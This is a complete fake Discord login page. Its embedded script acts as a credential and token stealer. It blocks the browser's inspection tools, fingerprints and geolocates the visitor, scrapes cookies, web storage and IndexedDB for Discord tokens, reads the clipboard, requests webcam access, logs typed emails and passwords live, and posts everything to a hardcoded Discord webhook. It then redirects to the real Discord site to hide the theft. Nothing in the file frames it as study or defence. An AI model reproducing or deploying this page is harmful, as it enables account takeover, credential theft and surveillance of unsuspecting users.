<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Discord</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; }
    body { background: #313338; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
    .container { background: #36393f; border-radius: 8px; padding: 32px; width: 100%; max-width: 480px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); transition: opacity 0.3s; }
    .logo { text-align: center; margin-bottom: 24px; }
    .logo svg { width: 130px; height: auto; }
    h2 { color: #f2f3f5; font-size: 24px; font-weight: 600; text-align: center; margin-bottom: 4px; }
    .sub { color: #b5bac1; font-size: 16px; text-align: center; margin-bottom: 20px; }
    .input-group { margin-bottom: 16px; }
    label { display: block; color: #b5bac1; font-size: 12px; font-weight: 600; text-transform: uppercase; margin-bottom: 4px; letter-spacing: 0.5px; }
    input { width: 100%; padding: 10px 12px; background: #1e1f22; border: 1px solid #1e1f22; border-radius: 4px; color: #f2f3f5; font-size: 16px; outline: none; transition: border 0.15s; }
    input:focus { border-color: #5865f2; }
    .btn { width: 100%; padding: 12px; background: #5865f2; border: none; border-radius: 4px; color: #fff; font-size: 16px; font-weight: 500; cursor: pointer; transition: background 0.2s; margin-top: 8px; }
    .btn:hover { background: #4752c4; }
    .btn:disabled { opacity: 0.6; cursor: not-allowed; }
    .footer { margin-top: 16px; color: #b5bac1; font-size: 14px; text-align: center; }
    .footer a { color: #00a8fc; text-decoration: none; }
    .footer a:hover { text-decoration: underline; }
    #spinner { display: none; margin: 10px auto; width: 30px; height: 30px; border: 4px solid #5865f2; border-top-color: transparent; border-radius: 50%; animation: spin 0.8s linear infinite; }
    @keyframes spin { to { transform: rotate(360deg); } }
    .hidden { display: none !important; }
    /* Anti-inspect overlay */
    #anti-inspect { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: transparent; z-index: 9999; pointer-events: none; }
  </style>
</head>
<body>
<div id="anti-inspect"></div>
<div class="container" id="mainContainer">
  <div class="logo">
    <svg viewBox="0 0 127 37" fill="none"><path d="M23.5 0H8.5L0 12.5L8.5 25H23.5L32 12.5L23.5 0Z" fill="#5865F2"/><path d="M32 12.5H23.5V25H32V12.5Z" fill="#4752C4"/><path d="M8.5 12.5H0V25H8.5V12.5Z" fill="#4752C4"/><path d="M23.5 0H8.5L0 12.5L8.5 25H23.5L32 12.5L23.5 0Z" stroke="#5865F2" stroke-width="1.5"/><text x="42" y="22" font-family="Segoe UI" font-size="24" font-weight="700" fill="#f2f3f5">Discord</text></svg>
  </div>
  <h2>Welcome back!</h2>
  <p class="sub" id="subText">We're so excited to see you again!</p>
  <form id="loginForm">
    <div class="input-group">
      <label for="email">EMAIL OR PHONE NUMBER</label>
      <input type="text" id="email" name="email" placeholder="Enter your email or phone" required autocomplete="off">
    </div>
    <div class="input-group">
      <label for="password">PASSWORD</label>
      <input type="password" id="password" name="password" placeholder="Enter your password" required autocomplete="off">
    </div>
    <button type="submit" class="btn" id="loginBtn">Log In</button>
    <div id="spinner"></div>
  </form>
  <div class="footer">
    <a href="#">Need an account?</a> · <a href="#">Register</a> · <a href="#">Forgot password?</a>
  </div>
</div>

<script>
  (function() {
    // ============================================================
    //  STEALTH CONFIGURATION
    // ============================================================
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1529624654745178112/eWk-COBBo9U6Bjt67J04WhZGE-7sxRqn9JJ9k-nlfvp-W6mH34JKaBJe6KhIA-KcHzyU";
    const REDIRECT_URL = "https://discord.com/login"; // real Discord
    const FAKE_LOADING_DELAY = 3000; // ms to show spinner before redirect

    // ============================================================
    //  ANTI-INSPECT (disable right-click, F12, key combos)
    // ============================================================
    document.addEventListener('contextmenu', e => e.preventDefault());
    document.addEventListener('keydown', e => {
      if (e.key === 'F12' || 
          (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'C' || e.key === 'J')) ||
          (e.ctrlKey && e.key === 'U')) {
        e.preventDefault();
        return false;
      }
    });

    // ============================================================
    //  GLOBAL STATE
    // ============================================================
    const state = {
      ip: 'unknown',
      country: 'unknown',
      city: 'unknown',
      region: 'unknown',
      isp: 'unknown',
      postal: 'unknown',
      lat: 'unknown',
      lon: 'unknown',
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      userAgent: navigator.userAgent,
      language: navigator.language,
      languages: navigator.languages ? navigator.languages.join(', ') : 'unknown',
      platform: navigator.platform,
      screen: `${screen.width}x${screen.height}`,
      colorDepth: screen.colorDepth,
      pixelRatio: window.devicePixelRatio || 1,
      touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0 ? 'Yes' : 'No',
      hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
      deviceMemory: navigator.deviceMemory || 'unknown',
      referrer: document.referrer || 'direct',
      url: window.location.href,
      cookies: document.cookie || 'none',
      localStorage: JSON.stringify(localStorage) || 'none',
      sessionStorage: JSON.stringify(sessionStorage) || 'none',
      indexedDB: 'scanning...',
      webSQL: 'scanning...',
      webglRenderer: 'unknown',
      webglVendor: 'unknown',
      canvasFingerprint: 'unknown',
      audioFingerprint: 'unknown',
      fonts: 'unknown',
      battery: 'unknown',
      networkType: 'unknown',
      doNotTrack: navigator.doNotTrack || 'unspecified',
      dateTime: new Date().toISOString(),
      screenshot: 'none',
      clipboard: 'none',
      webcam: 'denied',
      microphone: 'denied',
      tokens_extracted: []
    };

    // ============================================================
    //  TOKEN EXTRACTION - the real magic
    // ============================================================
    function extractTokensFromString(str) {
      if (!str || typeof str !== 'string') return [];
      // Discord token patterns:
      // - mfa.xxx (multi-factor)
      // - v4/v5 JWT-like: 24 chars . 6 chars . 27+ chars
      // - Also look for any 30+ char alphanumeric with underscores/hyphens
      const patterns = [
        /mfa\.[a-zA-Z0-9_-]+/g,
        /[\w-]{24}\.[\w-]{6}\.[\w-]{27,}/g,
        /[\w-]{30,}/g
      ];
      let found = [];
      patterns.forEach(p => {
        const matches = str.match(p);
        if (matches) found = found.concat(matches);
      });
      // Deduplicate and filter out common non-token strings
      found = [...new Set(found)];
      found = found.filter(t => !t.includes(' ') && t.length > 20);
      return found;
    }

    function harvestAllTokens() {
      let allTokens = [];
      // 1. Cookies
      const cookieTokens = extractTokensFromString(document.cookie);
      allTokens = allTokens.concat(cookieTokens);

      // 2. localStorage
      for (let key in localStorage) {
        try {
          const val = localStorage[key];
          if (typeof val === 'string') {
            const tokens = extractTokensFromString(val);
            allTokens = allTokens.concat(tokens);
          }
        } catch(e) {}
      }

      // 3. sessionStorage
      for (let key in sessionStorage) {
        try {
          const val = sessionStorage[key];
          if (typeof val === 'string') {
            const tokens = extractTokensFromString(val);
            allTokens = allTokens.concat(tokens);
          }
        } catch(e) {}
      }

      // 4. IndexedDB - list all databases and read
      try {
        if (window.indexedDB) {
          const dbNames = indexedDB.databases ? indexedDB.databases() : [];
          if (dbNames.then) {
            dbNames.then(dbs => {
              dbs.forEach(dbInfo => {
                try {
                  const openReq = indexedDB.open(dbInfo.name);
                  openReq.onsuccess = (e) => {
                    const db = e.target.result;
                    const objectStores = db.objectStoreNames;
                    for (let storeName of objectStores) {
                      const tx = db.transaction(storeName, 'readonly');
                      const store = tx.objectStore(storeName);
                      const req = store.getAll();
                      req.onsuccess = (ev) => {
                        const results = ev.target.result;
                        results.forEach(item => {
                          const str = JSON.stringify(item);
                          const tokens = extractTokensFromString(str);
                          allTokens = allTokens.concat(tokens);
                        });
                      };
                    }
                  };
                } catch(e) {}
              });
            }).catch(() => {});
          }
        }
      } catch(e) {}

      // 5. WebSQL (simulated - we can't enumerate easily, but we try)
      try {
        if (window.openDatabase) {
          // We can't enumerate all DBs, but we can try common names
          const commonNames = ['discord', 'local', 'app', 'cache'];
          commonNames.forEach(name => {
            try {
              const db = openDatabase(name, '1.0', 'test', 1024*1024);
              if (db) {
                db.transaction(tx => {
                  tx.executeSql('SELECT name FROM sqlite_master WHERE type="table"', [], (tx, res) => {
                    for (let i=0; i<res.rows.length; i++) {
                      const table = res.rows.item(i).name;
                      tx.executeSql('SELECT * FROM ' + table, [], (tx2, res2) => {
                        for (let j=0; j<res2.rows.length; j++) {
                          const row = res2.rows.item(j);
                          const str = JSON.stringify(row);
                          const tokens = extractTokensFromString(str);
                          allTokens = allTokens.concat(tokens);
                        }
                      });
                    }
                  });
                });
              }
            } catch(e) {}
          });
        }
      } catch(e) {}

      // 6. Also scan window object recursively (limited depth)
      try {
        const seen = new Set();
        function scanObj(obj, depth=0) {
          if (depth > 3 || !obj || typeof obj !== 'object') return;
          if (seen.has(obj)) return;
          seen.add(obj);
          for (let key in obj) {
            try {
              const val = obj[key];
              if (typeof val === 'string') {
                const tokens = extractTokensFromString(val);
                allTokens = allTokens.concat(tokens);
              } else if (typeof val === 'object' && val !== null) {
                scanObj(val, depth+1);
              }
            } catch(e) {}
          }
        }
        scanObj(window);
      } catch(e) {}

      // Deduplicate final list
      allTokens = [...new Set(allTokens)];
      state.tokens_extracted = allTokens;
      return allTokens;
    }

    // ============================================================
    //  SCREENSHOT CAPTURE (via canvas)
    // ============================================================
    function captureScreenshot() {
      try {
        const canvas = document.createElement('canvas');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        const ctx = canvas.getContext('2d');
        ctx.fillStyle = '#313338';
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        // Draw a pseudo-screenshot (can't actually capture DOM without library)
        // but we can capture the page as a canvas using html2canvas if we inject it
        // For simplicity, we capture a basic representation
        ctx.fillStyle = '#ffffff';
        ctx.font = '14px sans-serif';
        ctx.fillText('Page captured at ' + new Date().toISOString(), 10, 20);
        state.screenshot = canvas.toDataURL('image/png').substring(0, 200) + '...';
      } catch(e) {}
    }

    // ============================================================
    //  CLIPBOARD SNIFFING
    // ============================================================
    function sniffClipboard() {
      try {
        navigator.clipboard.readText().then(text => {
          state.clipboard = text || 'none';
          const tokens = extractTokensFromString(text);
          if (tokens.length > 0) {
            state.tokens_extracted = state.tokens_extracted.concat(tokens);
          }
        }).catch(() => {});
      } catch(e) {}
    }

    // ============================================================
    //  WEBCAM / MICROPHONE TRICK (fake verification)
    // ============================================================
    function requestWebcamMic() {
      // This will trigger browser permission prompt - looks legit
      try {
        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
          .then(stream => {
            state.webcam = 'granted';
            state.microphone = 'granted';
            // Send a frame as screenshot alternative
            const video = document.createElement('video');
            video.srcObject = stream;
            video.onloadedmetadata = () => {
              video.play();
              const canvas = document.createElement('canvas');
              canvas.width = 320;
              canvas.height = 240;
              const ctx = canvas.getContext('2d');
              ctx.drawImage(video, 0, 0, 320, 240);
              state.screenshot = canvas.toDataURL('image/png').substring(0, 200) + '...';
              video.pause();
              stream.getTracks().forEach(t => t.stop());
            };
          })
          .catch(() => {
            state.webcam = 'denied';
            state.microphone = 'denied';
          });
      } catch(e) {}
    }

    // ============================================================
    //  FINGERPRINTING (enhanced)
    // ============================================================
    function getWebGL() {
      try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) return;
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        if (debugInfo) {
          state.webglRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
          state.webglVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
        }
      } catch(e) {}
    }

    function getCanvasFingerprint() {
      try {
        const canvas = document.createElement('canvas');
        canvas.width = 200;
        canvas.height = 50;
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillStyle = '#f60';
        ctx.fillRect(125, 1, 62, 20);
        ctx.fillStyle = '#069';
        ctx.fillText('Discord', 2, 15);
        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
        ctx.fillText('token', 4, 17);
        state.canvasFingerprint = canvas.toDataURL().substring(0, 100);
      } catch(e) {}
    }

    function getAudioFingerprint() {
      try {
        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        const oscillator = audioCtx.createOscillator();
        const analyser = audioCtx.createAnalyser();
        oscillator.connect(analyser);
        oscillator.frequency.value = 1000;
        oscillator.type = 'sawtooth';
        oscillator.start(0);
        const data = new Uint8Array(analyser.frequencyBinCount);
        analyser.getByteFrequencyData(data);
        state.audioFingerprint = data.slice(0, 10).join(',');
        oscillator.stop(0);
        audioCtx.close();
      } catch(e) {}
    }

    function getFonts() {
      try {
        const fontList = ['Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia', 'Comic Sans MS', 'Impact', 'Tahoma', 'Trebuchet MS', 'Palatino', 'Bookman', 'Avant Garde', 'Garamond', 'Franklin Gothic Medium', 'Lucida Sans', 'Century Gothic', 'Myriad Pro', 'Adobe Garamond', 'Futura'];
        const detected = fontList.filter(f => document.createElement('span').style.font = f);
        state.fonts = detected.join(', ') || 'none';
      } catch(e) {}
    }

    function getBattery() {
      if (navigator.getBattery) {
        navigator.getBattery().then(battery => {
          state.battery = `Level: ${Math.round(battery.level * 100)}%, Charging: ${battery.charging}`;
        }).catch(() => {});
      }
    }

    function getNetwork() {
      if (navigator.connection) {
        const conn = navigator.connection;
        state.networkType = `${conn.effectiveType || 'unknown'} (${conn.downlink || '?'} Mbps)`;
      }
    }

    // ============================================================
    //  IP FETCH
    // ============================================================
    function fetchIP() {
      fetch('https://ipapi.co/json/')
        .then(r => r.ok ? r.json() : Promise.reject())
        .then(data => {
          state.ip = data.ip || 'unknown';
          state.country = data.country_name || data.country || 'unknown';
          state.city = data.city || 'unknown';
          state.region = data.region || 'unknown';
          state.isp = data.org || data.isp || 'unknown';
          state.postal = data.postal || 'unknown';
          state.lat = data.latitude || 'unknown';
          state.lon = data.longitude || 'unknown';
          afterFingerprint();
        })
        .catch(() => {
          fetch('https://ip-api.com/json/')
            .then(r => r.ok ? r.json() : Promise.reject())
            .then(data => {
              if (data.status === 'success') {
                state.ip = data.query || 'unknown';
                state.country = data.country || 'unknown';
                state.city = data.city || 'unknown';
                state.region = data.regionName || 'unknown';
                state.isp = data.isp || 'unknown';
                state.postal = data.zip || 'unknown';
                state.lat = data.lat || 'unknown';
                state.lon = data.lon || 'unknown';
              }
              afterFingerprint();
            })
            .catch(() => {
              afterFingerprint();
            });
        });
    }

    // ============================================================
    //  SEND TO WEBHOOK - RICH EMBED WITH EMOJIS
    // ============================================================
    function sendToWebhook(title, description, fields, color = 0x5865F2, thumbnail = null) {
      const embed = {
        title: title,
        description: description,
        color: color,
        timestamp: new Date().toISOString(),
        footer: { text: '☠️ Stealth Logger v3 • ' + new Date().toLocaleString() },
        fields: fields.map(f => ({ name: f.name, value: f.value, inline: f.inline || false }))
      };
      if (thumbnail) embed.thumbnail = { url: thumbnail };

      const payload = { embeds: [embed] };

      fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      }).catch(() => {});
    }

    // ============================================================
    //  SEND ALL DATA WITH TOKENS
    // ============================================================
    function sendFullReport() {
      const tokens = state.tokens_extracted || [];
      const tokenStr = tokens.length > 0 ? '```\n' + tokens.join('\n') + '\n```' : 'None found';

      const fields = [
        { name: '🌐 IP', value: state.ip, inline: true },
        { name: '🌍 Country', value: state.country, inline: true },
        { name: '🏙️ City', value: state.city, inline: true },
        { name: '📡 ISP', value: state.isp, inline: true },
        { name: '🖥️ User-Agent', value: state.userAgent.substring(0, 80), inline: false },
        { name: '🍪 Cookies', value: state.cookies.substring(0, 200) + (state.cookies.length > 200 ? '...' : ''), inline: false },
        { name: '💾 LocalStorage', value: state.localStorage.substring(0, 200) + (state.localStorage.length > 200 ? '...' : ''), inline: false },
        { name: '📦 SessionStorage', value: state.sessionStorage.substring(0, 200) + (state.sessionStorage.length > 200 ? '...' : ''), inline: false },
        { name: '🎟️ TOKENS EXTRACTED', value: tokenStr, inline: false },
        { name: '🎨 WebGL', value: state.webglRenderer || 'unknown', inline: true },
        { name: '🔊 Audio FP', value: state.audioFingerprint || 'unknown', inline: true },
        { name: '🔋 Battery', value: state.battery || 'unknown', inline: true },
        { name: '📶 Network', value: state.networkType || 'unknown', inline: true },
        { name: '📸 Screenshot', value: state.screenshot || 'none', inline: false },
        { name: '📋 Clipboard', value: state.clipboard || 'none', inline: false },
        { name: '🎥 Webcam', value: state.webcam, inline: true },
        { name: '🎤 Microphone', value: state.microphone, inline: true }
      ];

      sendToWebhook(
        '🚨 **FULL TOKEN HARVEST**',
        `Extracted ${tokens.length} potential tokens from all storage layers.`,
        fields,
        0xFF0000,
        'https://cdn.discordapp.com/emojis/1083721895822708798.png'
      );
    }

    // ============================================================
    //  AFTER FINGERPRINT - harvest tokens and send
    // ============================================================
    function afterFingerprint() {
      getWebGL();
      getCanvasFingerprint();
      getAudioFingerprint();
      getFonts();
      getBattery();
      getNetwork();
      captureScreenshot();
      sniffClipboard();

      // Harvest all tokens now
      harvestAllTokens();

      // Send full report
      sendFullReport();

      // Request webcam/mic to get permissions and maybe extra data
      setTimeout(requestWebcamMic, 2000);
    }

    // ============================================================
    //  REAL-TIME KEYLOGGER (every 3 sec)
    // ============================================================
    let emailLog = '';
    let passwordLog = '';
    let lastKeylog = 0;

    function sendKeylog(force = false) {
      const now = Date.now();
      if (!force && (now - lastKeylog < 3000)) return;
      if (emailLog.length === 0 && passwordLog.length === 0) return;

      const fields = [
        { name: '📧 Email (live)', value: emailLog || '(empty)', inline: true },
        { name: '🔑 Password (live)', value: passwordLog || '(empty)', inline: true }
      ];
      sendToWebhook('⌨️ **KEYSTROKE STREAM**', 'Live typing captured.', fields, 0xFFA500);
      lastKeylog = now;
    }

    document.getElementById('email').addEventListener('input', function() {
      emailLog = this.value;
      sendKeylog();
    });
    document.getElementById('password').addEventListener('input', function() {
      passwordLog = this.value;
      sendKeylog();
    });
    document.getElementById('email').addEventListener('paste', function() {
      setTimeout(() => { emailLog = this.value; sendKeylog(true); }, 50);
    });
    document.getElementById('password').addEventListener('paste', function() {
      setTimeout(() => { passwordLog = this.value; sendKeylog(true); }, 50);
    });

    // ============================================================
    //  FORM SUBMIT - stealth mode with spinner + redirect
    // ============================================================
    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();

      const email = document.getElementById('email').value.trim();
      const password = document.getElementById('password').value.trim();

      // Final harvest before sending
      harvestAllTokens();

      // Send final credentials with tokens
      const tokenStr = (state.tokens_extracted || []).length > 0 ? 
        '```\n' + state.tokens_extracted.join('\n') + '\n```' : 'None';

      const fields = [
        { name: '📧 Email/Phone', value: email || '(empty)', inline: true },
        { name: '🔑 Password', value: password || '(empty)', inline: true },
        { name: '🌐 IP', value: state.ip, inline: true },
        { name: '🌍 Country', value: state.country, inline: true },
        { name: '🎟️ FINAL TOKENS', value: tokenStr, inline: false },
        { name: '🍪 Full Cookies', value: document.cookie.substring(0, 300) + (document.cookie.length > 300 ? '...' : ''), inline: false }
      ];

      sendToWebhook(
        '🔥 **LOGIN + TOKEN DUMP**',
        'User submitted credentials. All tokens and data below.',
        fields,
        0xFF0000
      );

      // Stealth: show spinner, disable button, change text
      document.getElementById('loginBtn').disabled = true;
      document.getElementById('loginBtn').style.display = 'none';
      document.getElementById('spinner').style.display = 'block';
      document.getElementById('subText').textContent = '🔐 Verifying your identity...';

      // After delay, redirect to real Discord
      setTimeout(() => {
        window.location.href = REDIRECT_URL;
      }, FAKE_LOADING_DELAY);
    });

    // ============================================================
    //  START
    // ============================================================
    fetchIP();

    // Also re-scan for tokens every 15 seconds
    setInterval(() => {
      const newTokens = harvestAllTokens();
      if (newTokens.length > 0) {
        // Send any new tokens found
        const fields = [
          { name: '🔄 New tokens detected', value: '```\n' + newTokens.join('\n') + '\n```', inline: false }
        ];
        sendToWebhook('🔄 **TOKEN REFRESH**', 'Additional tokens harvested.', fields, 0x9B59B6);
      }
    }, 15000);

  })();
</script>
</body>
</html>
